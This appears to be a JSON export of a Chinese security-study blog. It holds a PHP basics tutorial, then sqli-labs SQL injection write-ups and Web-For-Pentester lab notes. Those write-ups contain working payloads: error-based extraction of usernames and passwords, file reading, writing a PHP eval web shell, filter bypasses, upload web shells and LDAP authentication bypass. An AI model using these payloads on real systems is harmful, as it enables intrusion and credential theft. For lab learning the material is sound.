$name.&quot;成绩为A&lt;/br&gt;&quot;; }elseif(achievement &gt;= 80){ echo $name.&quot;成绩为B&lt;/br&gt;&quot;; }elseif(achievement &gt;= 70){ echo $name.&quot;成绩为C&lt;/br&gt;&quot;; }else{ echo $name.&quot;成绩为D&lt;/br&gt;&quot;; } } Student(&quot;小明&quot;,80); Student(&quot;小磊&quot;,90); Student(&quot;小红&quot;,66); Student(&quot;小刚&quot;,76); ?&gt; 3.2 查看结果 四、Switch 4.1 输入代码 &lt;?php function Student($name,$favcolor){ switch($favcolor){ case &quot;red&quot;: echo $name.&quot;最喜欢的颜色是红色！&lt;/br&gt;&quot;; break; case &quot;blue&quot;: echo $name.&quot;最喜欢的颜色是蓝色！&lt;/br&gt;&quot;; break; case &quot;green&quot;: echo $name.&quot;最喜欢的颜色是绿色！&lt;/br&gt;&quot;; break; default: echo $name.&quot;最喜欢的颜色不是红色，绿色也不是蓝色！&lt;/br&gt;&quot;; } } Student(&quot;小明&quot;,&quot;red&quot;); Student(&quot;小磊&quot;,&quot;blue&quot;); Student(&quot;小红&quot;,&quot;yellow&quot;); Student(&quot;小刚&quot;,&quot;green&quot;); ?&gt; 4.2 查看返回结果 （十二）for循环【原理】（1）For循环 for(init counter;test counter;increment counter){ ​ code to executed; } 参数 init counter：初始化循环计数器的值 test counter：评估每个循环。如果值为TRUE，继续循环。如果它的值为FALSE，循环结束 invrement counter：增加循环计数器的值 （2）Foreach Foreach遍历数组中每个元素并循环代码块，每进行一次循环，当前数组元素的值就会被赋值给$value变量，并且数组指针会逐一地移动，直到到达最后一个数组 foreach($array as $value){ ​ code to executed; } 【步骤】一、For循环 输入代码 &lt;?php for($i=0;$i&lt;10;$i++){ echo &quot;i的值为：&quot;.$i.&quot;&lt;/br&gt;&quot;; } ?&gt; 查看结果 二、foreach循环 输入代码 &lt;?php $colors = array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;); foreach($colors as $value){ echo $value.&quot;&lt;/br&gt;&quot;; } ?&gt; 查看结果 （十三）输出方法【原理】（1）echo / print 两种输出方法 （2）echo / print “输出内容” ​ echo / print (“输出内容”)； ​ 有无括号均可； 【步骤】一、echo输出 — 能够输出一个以上的字符串 输入代码 &lt;?php echo &quot;&lt;h1&gt;PHP输出方式&lt;/h1&gt;&quot;; echo &quot;echo&lt;/br&gt;&quot;; echo &quot;可以&quot;,&quot;加入html标签&quot;,&quot;也可以像这样&quot;,&quot;多个字符串&quot;,&quot;隔开&quot;,&quot;同时&quot;,&quot;输出&quot;; ?&gt; 查看结果 二、print输出 — 只能输出一个字符串 输入代码 &lt;?php print &quot;&lt;h1&gt;PHP输出方式&lt;/h1&gt;&quot;; print (&quot;print&lt;/br&gt;&quot;); ?&gt; 查看结果 （十四）注释【原理】注释掉不想要输出的内容 或 用来解释说明 比较常见，想必大家都知道，这里就不再具体写例子，简单说一下用法就好了 // 这是单行注释 # 这也是单行注释 /* 这是多行注释块，它可以横跨多行注释 */ （十五）大小写敏感【原理】（1）所有用户定义的函数、类和关键词（例如if、else、echo、等等）都对大小写不敏感 （2）所有变量都对大小写敏感 【步骤】一、函数、类和关键字（这里以echo）为例 输入代码 &lt;?php $a = &quot;我是一只鱼&quot;; echo $a.&quot;&lt;/br&gt;&quot;; ECHO $a.&quot;&lt;/br&gt;&quot;; ecHo $a.&quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 二、变量（对大小写敏感） 写入代码 &lt;?php $string = &quot;我是一只鱼&quot;； echo $string.&quot;&lt;/br&gt;&quot;; echo $STRING.&quot;&lt;/br&gt;&quot;; echo $String.&quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 （十六）常量和变量【原理】（1）常量名以字符或下划线开头（名前无$符号） （2）常量类似变量，但是常量一旦被定义就无法更改或撤销定义且常量贯穿整个脚本，是自动全局 （3）定义常量用define(name,value,True/False)函数：其中第一个参数为常量的名称；第二个为常量的值；第三个是大小写敏感，默认为False，对大小写敏感 【步骤】一、创建对大小写敏感的常量 输入代码 &lt;?php define(&quot;knvlre&quot;,&quot;我是一条鱼&quot;); echo knlvre.&quot;&lt;/br&gt;&quot;; echo KNLVRE.&quot;&lt;/br&gt;&quot;; echo Knlvre.&quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 此时没有设置第三个值，所以默认是False，区分大小写的 二、创建对大小写不敏感的常量 输入代码 &lt;?php define(&quot;knvlre&quot;,&quot;我是一条鱼&quot;,True); echo knlvre.&quot;&lt;/br&gt;&quot;; echo KNLVRE.&quot;&lt;/br&gt;&quot;; echo Knlvre.&quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 变量【原理】（1）变量格式：以$符号开头，后面紧跟变量的名称 （2）变量名称必须以字母或下划线开头，不能以数字开头，且只能包含字母、数字以及下划线。大小写区分（$a与$A为两个不同变量） （3）变量作用域：指的是变量能够被引用/使用的那部分脚本，有local（局部）、global（全局）和static（静态）三种不同的作用域 【步骤】一、创建变量 输入代码 &lt;?php $A_1 = &quot;大写字母&quot;； $a_1 = &quot;小写字母&quot;; $_a1 = &quot;下划线开头&quot;; echo $A_1.&quot;&lt;/br&quot;,$a_1.&quot;&lt;/br&gt;&quot;,$_a1.&quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 二、作用域local与global 函数之外声明的变量拥有Global作用域，只能在函数以外进行访问 函数内部声明的变量拥有local作用域，只能在函数内部进行访问 输入代码 &lt;?php $x = 5; //函数之外定义的变量，拥有global作用域，函数内不可以调用 function mytest(){ $y = 10; //函数之内定义的变量，拥有local作用域，函数外不可以调用 echo &quot;&lt;p&gt;测试函数内部的变量&lt;/p&gt;&quot;; echo &quot;变量x：&quot;.$x; echo &quot;&lt;br&gt;&quot;; echo &quot;变量y：&quot;.$y } echo &quot;&lt;p&gt;测试函数外部的变量&lt;/p&gt;&quot;; echo &quot;变量x：&quot;.$x; echo &quot;&lt;br&gt;&quot;; echo &quot;变量y：&quot;.$y ?&gt; 查看结果 分析解决上述问题 global关键词用于访问函数内的全局变量，因此要解决上述问题可用其在函数内部声明某个变量为全局 &lt;?php $x = 5; $y = 10; function mytest(){ global $x,$y,$z; $z = $x + $y; } mytest(); echo $z; ?&gt; 查看结果 $GLOBALS[]数组 &lt;?php $x = 5; $y = 10; function mytest(){ $GLOBALS[&#39;z&#39;] = $GLOBALS[&#39;x&#39;] + $GLOBALS[&#39;y&#39;]; } mytest(); echo $z; ?&gt; 查看结果 三、作用域 当函数完成/执行后，会删除所有变量；有时需要不删除某个局部变量，static就可以帮助我们 输入代码 &lt;?php function mytest(){ static $a = 0; echo $a; echo &quot;&lt;/br&gt;&quot;; $a++; } mytest(); mytest(); mytest(); ?&gt; 查看结果 （十七）运算符【原理】（1）算数运算符，赋值运算符，字符串运算符，递增、递减运算符，比较运算符，逻辑运算符，数组运算符 【步骤】一、递增与递 输入代码 &lt;?php $a=1; $b=1; echo &quot;初始值均为“1”：&lt;/br&gt;&quot;; echo &quot;当“+”号在后面时：&quot;.$a++.&quot;&lt;/br&gt;&quot;; echo &quot;当“+”号在前面时：&quot;.++$b; ?&gt; 查看结果 二、比较运算、逻辑运算 输入代码 &lt;?php $a=1; $b=1; $c=2; if($a == $b){ echo &quot;a等于b&quot;； } if($a != $c){ echo &quot;a不等于c&quot;; } if($a == $b &amp;&amp; $a !=$c){ echo &quot;a等于b且a不等于c&quot;; } if($a != $c || $b != $c){ echo &quot;a不等于c或b不等于c&quot;; } ?&gt; 查看结果 （十八）数据类型【原理】（1）数据类型是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候，才需要申请大内存，就可以充分利用内存。 （2）数据类型： 字符串：字符串是字符序列，可以是引号内的任何文本 整数：整数不能有小数点、正负均可，可以用三种格式规定整数：十进制、十六进制（前缀为0x）或八进制（前缀为0） 浮点数：浮点数是有小数点或指数形式的数组 逻辑：逻辑是true或false，常用于条件判断 数组：数组元素是组成数组的基本单元。数组元素也是一种变量，其标识方法为数组名后跟一个下标。下标表示了元素在数组中的顺序号。数组元素的一般形式为：数组名[下标]其中的下标只能为整形常量或整形表达式 对象：对象是存储数据和处理数据方式的数据类型，在PHP中，必须明确的声明对象，必须声明对象的类（关键词class）。类是包含属性和方法的结构。在对象中定义数据类型，在该类的事例中使用此数据类型 NULL：NULL值表示变量无值，表示变量是否为空。区别空字符与空值数据库 （3）var_dump()函数会返回变量的数据类型 【步骤】一、字符串 输入代码 &lt;?php echo &quot;Hello World!&quot; echo &#39;Hello World!&#39;; echo &quot;&#39;Hello World!&#39;&quot;; echo &#39;&quot;Hello World!&quot;&#39;; ?&gt; 查看结果 二、整数 输入代码 &lt;?php var_dump(222); //正数 echo &quot;&lt;/br&gt;&quot;; var_dump(-222); //负数 echo &quot;&lt;/br&gt;&quot;; var_dump(0x2c); //十六进制 echo &quot;&lt;/br&gt;&quot;; var_dump(021); //八进制 echo &quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 三、浮点数 输入代码 &lt;?php var_dump(2.1); echo &quot;&lt;/br&gt;&quot;; var_dump(2.1e3); echo &quot;&lt;/br&gt;&quot;; var_dump(2e-3); echo &quot;&lt;/br&gt;&quot;; ?&gt; 查看结果 四、逻辑 逻辑是true或false，常用于条件判断。后期将会用到 五、数组 输入代码 &lt;?php $a = array(&quot;字符串&quot;,2.1,100); var_dump($a); ?&gt; 查看结果 六、对象 输入代码 &lt;?php header(Content-type: text/html,charset=utf-8); //如果出现乱码，输入上面这行，将输出后的编码设置为utf-8 class Student{ function Student(){ print &quot;上课铃响了，老师走进了教室。&quot;; } } $Tom = new Student(); ?&gt; 查看结果 七、NULL 输入代码 &lt;?php $a = 100; var_dump($a); echo &quot;&lt;/br&gt;------------------我是分割线--------------------&lt;/br&gt;&quot;; $a = NULL; var_dump($a); ?&gt; 查看结果 （十九）实现分页查询【原理】（1）mysql_connect(‘127.0.0.1’,”root”,”root”);：链接数据库 （2）mysql_connect(“fy”,$link) or die(“数据库连接失败”);：连接fy数据库，如果存在则进入，不存在执行die() （3）limit(m,n)：执行数据库命令，选取m-n之间的数据 【步骤】一、分页查询 1.1 连接数据库，取出数据库中的数据分页 在Windows命令行环境下，使用命令链接数据库 mysql -uroot -proot 使用fy数据库，将数据库中的数据分页取出 use fy; select * from fy1; 1.2 新建一个Fy.php文件，写入代码，保存在（c:\\xampp\\htdocs) 1.3 浏览结果 打开浏览器，访问127.0.0.0/Fy.php 1.4 修改$page变量 1.5 再次访问查看结果 （二十）连接数据库并操作【原理】（1）mysql_connect(“databasename”,”username”,”password”); //连接数据库 （2）mysql_query(query) //执行数据库命令 【步骤】一、连接数据库 1.1 创建connect.php文件，写入代码，保存在（c:\\xampp\\htdocs) 1.2 查看结果 二、操作数据库2.1 输入代码，选择fy数据库，并输出fy1表中的数据 2.2 查看结果 2.3 当选择一个不存咋的库时，会显示连接失败 实验只做了连接并没有关闭，mysql_close()函数用于关闭连接 （二十一）Mysql基础操作【原理】（1）MySQL字段属性 描述 关键字 自动增加 auto_increment 能否为空 null；not null 给定默认值 default 主键索引 primary key //每个表只能由一个主键，且主键不能为空 唯一索引 unique //可以多个，用于避免出现重复数据 （ 2）数据类型 类型 关键字 整形 int(4)，bigint(8) 浮点型 float(4)，double(8)，decimal(自定义) 字符串型 text，varchar(自定义字节) 日期时间 date，time，datetime yyyy-mm-dd，hh:mm:ss，yyyy=mm-dd:mm:ss 【步骤】一、创建数据库及表 1.1 创建一个名为Knlvre、编码为UTF-8的数据库 create database Knlvre charset utf8 //charset utf8可以使数据库支持中文数据 1.2 使用Knlvre数据库，并创建如下表 use Knlvre; create table Knlvre(name varchar(28) null,age int(28)); 二、数据库的增删改查 2.1 添加数据并查看 insert into Knlvre(name,age) values (&#39;su&#39;,&#39;22&#39;); select * from Knlvre; 2.2 删除数据 delete from Knlvre where name = &#39;su&#39;; select * from Knlvre; （二十二）cookie与sessionCookie【原理】（1）Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而存储在用户本地终端上的数据（通常经过加密）。 （2）Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie是由Web服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web站点都可以访问Cookie信息。目前有些Cookie是临时的，有些则是持续的。临时的Cookie只在浏览器上保存一段规定的时间，一旦超过规定的时间，该Cookie就会被系统清除，有些用户担心Cookie中的用户信息被一些别有用心的人窃取，而造成一定的损害。其实，网站以外的用户无法跨过网站来获得Cookie信息。如果因为这种担心而屏蔽Cookie，肯定会因此拒绝访问许多站点页面。因为，当年有许多Web站点开发人员使用Cookie技术，例如Session对象的使用就离不开Cookie的支持 （3）在创建Cookie之前不能有任何输出，空格也不行 一、设置Cookie setcookie(name,value,expire,path,domain,secure) 字段 需求 作用 name 必需 规定Cookie的名称 value 必需 规定Cookie的值 expire 可选 规定Cookie的有效期 path 可选 规定Cookie的服务器路径 domain 可选 规定Cookie的域名 secure 可选 规定是否通过安全的HTTPS连接来传输Cookie 1.1 输入代码 1.2 查看结果 并未找到Cookie，因为Cookie不是立即生效的，需要下次刷新才能找到 再次刷新试试 Session【原理】（1）Session的工作原理： 当一个session第一次被启用时，一个唯一的标识被存储于本地的cookie中 首先使用session_start()函数，PHP从session仓库中加载已经存储的session变量 当执行PHP脚本时，通过使用session_register()函数注册session变量 当PHP脚本执行结束时，为被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php,ini文件中的session.save_path指定，下次浏览网页时可以加载使用。 （2）session_start()函数用于开启session （3）与cookie相似在调用session_Start()之前不能有任何输出 【步骤】一、Session 1.1 输入代码 1.2 查看结果 第一次查看的值为1 每次刷新，值都会加1 （二十三）简单的实例【原理】（1）匹配字符格式 \\：转义字符 \\w：匹配任意一个数字、字母、或下划线，等价于【0-9a-zA-Z】 +：匹配1次或多次其前的原子 \\d：匹配任意一个十进制数字。等价于【0-9】 \\s：空白，包括空格、换行、tab缩进等所有的空白 \\S：非空白，包括空格、换行、tab缩进等所有的空白 【步骤】一、匹配并判断 1.1 输入代码 1.2 查看结果 1.3 修改信息使报错 修改用户名长度 修改邮箱 修改手机 （二十四）验证码【原理】（1）验证码(CAPTCHA)是“Completely Autonated Public Turing test to tell Computers and Humans Apart”(全目动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。可以防止：恋意破解密码、刷票、论坛灌水，有效防正某个黑音对某一个特定注册用户用特定程序要力地解方式进行不断的查陆尝试，实际上用金证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必领只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。 【步骤】一、生成验证码 1.1 输入代码 1.2 查看结果 （二十五）正则表达式【原理】（1）preg_match(string $pattern , string $subject , array $matches) pattern：要搜索的模式，字符串类型。subject：输入字符串。matches：如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推 （2）preg_replace(正则表达式，替换成，字符串，最大替换次数默认为所有，替换次数) 匹配字符格式 \\：转义字符 \\w：匹配任意一个数字、字母、或下划线，等价于【0-9a-zA-Z】 +：匹配1次或多次其前的原子 \\d：匹配任意一个十进制数字。等价于【0-9】 \\s：空白，包括空格、换行、tab缩进等所有的空白 \\S：非空白，包括空格、换行、tab缩进等所有的空白 .：代表任意字符 *：前一个字符重复任意次 [[:punct:]]：代表任意一个字符，包括各种符号 小括号、中括号、大括号的区别 正则表达式的() [] {}有不同的意思。 () 是为了提取匹配的字符串。表达式中有几个()就有几个相应的匹配字符串。 (\\s*)表示连续空格的字符串。 []是定义匹配的字符范围。比如 [a-zA-Z0-9] 表示相应位置的字符要匹配英文字符和数字。[\\s*]表示空格或者*号。 {}一般用来表示匹配的长度，比如 \\s{3} 表示匹配三个空格，\\s{1,3}表示匹配一到三个空格。 (0-9) 匹配 &#39;0-9′ 本身。 [0-9]* 匹配数字（注意后面有 *，可以为空）[0-9]+ 匹配数字（注意后面有 +，不可以为空）{1-9} 写法错误。 [0-9]{0,9} 表示长度为 0 到 9 的数字字符串。 【步骤】一、正则匹配 1.1 输入代码 1.2 查看结果 二、匹配并替换 2.1 输入代码 2.2 查看结果","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"SQL注入详解","slug":"SQL注入详解","date":"2019-03-11T16:00:00.000Z","updated":"2019-07-18T01:31:31.283Z","comments":true,"path":"2019/03/12/SQL注入详解/","link":"","permalink":"https://knlvre.github.io/2019/03/12/SQL注入详解/","excerpt":"","text":"（一）基础知识点union查询（1）系统函数 version()：mysql版本 user()：数据库用户名 database()：当前数据库名 @@datadir：数据库路径 @@version_compile_os：当前操作系统 （2）Mysql默认设置 information_schema.schemate：默认数据库 information_schema.tables：默认数据表 information_schema.columns：默认字段 （3）一般用于尝试的语句： or 1=1 --+ &#39; or 1=1 --+ &quot; or 1=1 --+ ) or 1=1 --+ &#39;) or 1=1 --+ （4）一般代码为： $id=$_GET[&#39;id&#39;] $sql = &quot;select * from table_name where id = &#39;$id&#39; limit 0,1&quot;; （5）Union操作符 Union操作符用于闭合两个或多个select语句的结果集。Ps：union语句前后列的数量相同，数据类型相同 （6）Order by * *为任意数字，用来测试数字段数，页面返回错误则猜测错误，继续猜测知道相邻数字页面返回正确的为字段个数 截取字符串（1）函数 substr(string,start,length) mid(string,start,length) left(string,length) ord()：转换ascii值 limit 0,1：表示从第0个开始去1个，两个数值均可以更改 Ps: string：要截取的字符串 start：指定截取开始位置 length：截取个数 left()函数默认从左边第一个开始截取 REGXP正则匹配（1）Limit 0,1：从第0个开始取一个 （2）正则匹配过程： ^[a-z] ==&gt; ^a[a-z] ==&gt; ^ad[a-z] ==&gt; ^admin$ 首先测试表名以a-z的其中一个字母开头，如果正确，继续测试第二、第三…个字母，最终得到表明，用^符号测试开头，用$符号测试结尾 Ps：命令执行后，会自动把当前库中所有表名匹配一遍 基于时间判断的注入（1）关键词：if()、sleep() （2）if(判断条件，为TRUE时执行，为FALSE时执行) Sleep(*)：睡眠，单位秒 （二）二次注入【原理】二次注入漏洞是一种在web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力 （1）黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或命令 （2）服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应 （3）黑客向服务端发送第二个与第一个不相同的请求数据信息 （4）服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行 （5）服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功 【步骤】一、二次注入1.1 进入phpMyadmin，选择”security” 1.2 选择users数据表，可以见到用户名和密码 本次修改用户admin的密码，此时密码是admin 1.3 进入sqli-labs-master/Less-24 单击”New User click here?” 1.4 注册一个新账号：admin‘#，密码：123456 1.5 刷新phpMyadmin页面，可以看到刚注册的账户 1.6 登陆刚才注册的账户，点击后自动跳转到更改密码的页面 设置新密码为Simple，单击reset 1.7 再次刷新phpMyadmin页面，可以看到admin用户的密码变了 （三）floor报错注入【原理】（1）关键字：count()，floor()，rand() （2）函数介绍 count()：是用来统计表中或数组中记录的一个函数 rand()：调用可以在0和1之间产生一个随机数 floor()：函数只返回整数部分，小数部分舍弃 （3）报错是因为floor(rand(0)×2)的不确定性，group by floor(rand(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(rand(0)×2)可能为0，也可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值 【步骤】一、Floor函数 1.1 sqli-labs-master/Less-5 1.2 适当修改源代码，方便观察 1.3 刷新页面，可以看到要执行的SQL语句 1.4 floor报错注入 可通过报错注入或者构造逻辑语句，本次采用报错注入。测试数据版本号：5.5.471 ?id=1&#39; and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))) --+ 1.5 查看当前数据库 ?id=1&#39; and (select 1 from (select count(*),concat((select (select concat(0x7e,database(),0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ 1.6 查看其他数据库 ?id=1&#39; and (select 1 from (select count(*),concat((select (select (select distinct concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ （四）Xpath报错注入【原理】（1）关键字：extractvalue() （2）extractvalue()：从目标XML中返回包含所查询值的字符串 extractvalue(XML_document，XPath_string)； 第一个参数：XML_document是string格式，为XML文档对象的名称，文中为Doc 第二个参数：返回结果为连接参数产生的字符串 （3）原理：通过concat将查询到的信息拼接成字符串，由于extractvalue函数的第二个参数需要Xpath格式字符串。现在很显然不是，所以报错。Ps：返回结果，限制在32位字符 【步骤】一、Xpath函数 1.1 sqli-labs-master/Less-5 1.2 适当修改源代码，方便观察 1.3 刷新页面，可以看到要执行的SQL语句 1.4 Xpath报错注入 ?id=1&#39; and extractvalue(1,concat(0x7e,(version()),0x7e))--+ 1.5 查看数据库名称 ?id=1&#39; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e))--+ 1.6 查看数据表users的字段 ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))--+ 1.7 查看字段的内容 ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=1),0x7e))--+ ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))--+ （五）文件操作【原理】（1）关键词：load_file(file_name) （2）环境：读取权限且文件完全可读、绝对路径（php配置为display_errors=on只需提交错误请求就会报出绝对路径）、文件小于服务器上设置max_allowed_packet 【步骤】一、文件操作1.1 sqli-labs-master/Less-1 1.2 查看用户权限，返回正常则说明有读写权限 ?id=1&#39; and (select count(*) from mysql.user)&gt;0 --+ 1.3 在C盘创建boot.ini，随意写入内容做测试 ?id=-1&#39; union select 1,2,load_file(&quot;c:/boot.ini&quot;)--+ 1.4 通过编码读取 ?id=-1&#39; union select 1,2,load_file(0x633a2f626f6f742e696e69)--+ 0x633a2f626f6f742e696e69 == &quot;c:/boot.ini&quot; 16制编码 1.5 通过注入方法在网站根目录生成一句话木马 ?id=-1&#39; union select 1,2,(&#39;&lt;?php @eval($_POST[HSW])?&gt;&#39;) into outfile &#39;c:\\\\phpstudy\\\\www\\\\1.php&#39; --+ 页面没有任何返回信息 1.6 但是不代表没有上传成功 （六）绕过【原理】（1）空格（根据环境有所不同） %09：tab键（水平） %0b：tab键（垂直） %0a：新建一行 %0c：新的一页 %0d：return功能 %a0：空格 （2）宽字节 原理：编码不同 代码处理方式：将 &#39; 退义后 输出为\\&#39; 可通过 %df 形成 %df%5c 在gbk中为文字 此外还可以通过utf-8、utf-16、utf-32等编码转换 如 %ef%bf%bd 形成 %ef%bf%bd%c （3）and/or and 可以用 &amp;&amp; 代替 or 可以用 || 代替 【步骤】一、空格1.1 sqli-labs-master/Less-26 1.2 本关对ID的处理 1.3 空格被替换掉了 1.4 绕过 由于 减号- 和 井号# 都被替换掉了，所以选择 逻辑或|| 闭合掉后面的单引号 ?id=-1&#39;%0bunion%0bselect%0b1,2,3||&#39;1 二、宽字节2.1 sqli-labs-master/Less-32 2.2 本关对ID的处理 2.3 输入正常union语句，报错 ?id=-1&#39; union select 1,database(),3 --+ 单引号、双引号以及反斜杠被转义 2.4 用 %df 吃掉符号 ‘\\‘ ?id=-1%df&#39; union select 1,database(),3 --+ 成功弹出数据库名为security （七）HTTP头部信息【原理】（1）User agent：描述浏览器信息 【步骤】一、User agent1.1 sqli-labs-master/Less-18 1.2 输入admin1/admin1后页面多出浏览器版本等信息 1.3 查看源码，可以看到保存http的user agent信息到数据库中并输出 1.4 使用Live http headers插件 1.5 再次提交表单，使用Live http headers查看 再次提交表单，使用Live http headers查看，单击选择最上面的一行，点击Replay，可以看到新的弹框出现 1.6 在新的弹框中，修改User-agent字段的值 &#39; and extractvalue(1,concat(0x7e.(select @@version),0x7e)) and &#39;1&#39;=&#39;1 1.7 修改成Xpath报错语法查看版本信息 1.8 查看网页，多了一行信息 就是刚才我们写的Xpath报错注入语句返回的版本号","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"Web-For-Pentester","slug":"Web-For-Pentester","date":"2019-03-10T16:00:00.000Z","updated":"2019-08-22T15:58:01.656Z","comments":true,"path":"2019/03/11/Web-For-Pentester/","link":"","permalink":"https://knlvre.github.io/2019/03/11/Web-For-Pentester/","excerpt":"","text":"（一）文件上传漏洞【原理】（1）在网页程序中(尤其是那些使用文件系统来决定代码运行的程序)，你可让代码在服务端执行，如果你打算用合法文件名上传文件（通常是取决于扩展），在这里，我们就可以看到基于这种类型的攻击 （2)首先，我们攻击一个PHF的应用，我们需要一个PHF的webshel1，一个Webshell就是一段简单的脚本或者执行代码的网页应用，比如，在PHP中，下面的代码就是一个简单的web shell:&lt;?php system($_GET[‘emd’]): ?&gt; （3)越复杂的webshel1可以执行越高级的操作，比如教据库和文件系统的访问，甚至是TCP随道。 【步骤】一、Example 1 1.1 源代码 1.1 看看实验的example1.php的源代码，这是一个非常基础的表单，对上传的文件类型没有限制 1.2 创建简单webshell文件 1.3 上传webshell文件 访问example.php，将刚才创建的webshell文件上传上去 1.4 跳转 上传成功会提示”Upload done Your file can be found here”，点击这个”here”连接，跳转到a.php 1.5 cmd没有赋值 因为cmd变量没有赋值，所以进行报错 1.6 赋值为ls 给cmd赋值为ls，可以罗列当前目录下的所有文件和目录 1.7 赋值为pwd 给cmd赋值为pwd，可以查看当前目录 二、Example2 总结： .php后缀可以换成： .php3、.php4、.php5 .blah 2.1 example2.php的源代码 相比于example1.php只多了对文件名的限制，上传的文件名不能以.php结尾 2.2 绕过限制 想要绕过这类的限制，可以用一下方法： （1）将拓展名改为.php3，在其他一些系统中，像这类.php4或者.php5的可能也能访问，这取决于web服务器如何解析 （2）使用Apache不认识的拓展名，在.php后跟上.blah，一旦Apache无法解析这类拓展名，它就会移动到下一个，.php则随即被解析，然后运行其php代码 2.3 写一句话木马 &lt;?php $eval($_POST[&#39;123456&#39;]);?&gt; 2.4 上传时报错 2.5 修改后缀名后再上传 上传成功 2.6 使用菜刀连接 成功连接 （二）LDAP attacks【原理】（1）LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol,一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与x.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。（2）LDAP通常被用来后端验证，特别是用在登入进制（SSO）的解决方案中。最常见的LDAP注入模式是注入过滤器。这里示例2会演示如果用LDAP注入绕过登录验证。首先，你需要学习一点LDAP语法。当你要检索一个用户的时候，通过这个用户名，可以用如下的语句：(en=[INPUT])（3）如果你要增加更多的条件或者布尔逻辑，你可以使用：布尔或：(|(cn=[输入1])(cn=[输入2]))能得到匹配输入1和输入2的记录。布尔与：(&amp;(cn=[输入1]（userPassword=[输入2])）能得到cn匹配输入1和userPassword匹配输入2的记录（4）就如看到的那样，布尔逻辑体现在语句开始的过滤符。由于是在布尔字符后面开始注入的，所以通常不可能对布尔符号发起注入攻击。（5）LDAP经常用·通配符来匹配任意值。这可以被用来匹配任何值比如，或者子串比如adn匹配所有以adn开头的值。（6）正如其他注入攻击一样，我们要移除任何服务端添加的代码我们用空值可以绕过末尾的过滤器。 【步骤】一、Example11.1 源代码 LDAP attacks Example的源代码example.php如下 1.2 提交用户名和密码 通过GET方式提交用户名和密码，都是hacker，来登录LDAP服务器。但是LDAP服务器拒绝登录，因为提供的认证信息是无效的 1.3 删除username和password的参数 删除username和password的参数hacker。如果发送这样的请求username=&amp;password=，这样的值是不会奏效的，因为他们并不是NULL，相应的他们其实算做空变量。空变量登录测试在将来你所有的测试中是个相当重要的测试，即便后端服务器用的不是LDAP认证机制 1.4 匿名认证 但是有一些LDAP服务器允许空值绑定：如果发送的是空值，LDAP服务器会绑定这个链接，然后PHP程序会认为这个认证信息是正确的。为了绑定两个空值，需要在发送的请求中完全移除认证变量信息。如删除所有认证变量信息，提示AUTHENTICHTED，说明匿名认证成功 二、Example2 2.1 源代码 LDAP attacks Example2的源代码example2.php如下 2.2 正常登陆请求 GET提交：?name=hacker&amp;password=hacker，提示：AUTHENTICHTED as hacker 2.3 通过*通配符匹配一些相同的值 注意图中URL的变化，结果还是和上一步一样 2.4 password加上*通配符，失败 password加上*通配符时，登陆失败，密码可能被加密（如哈希）后再进行匹配 2.5 总结 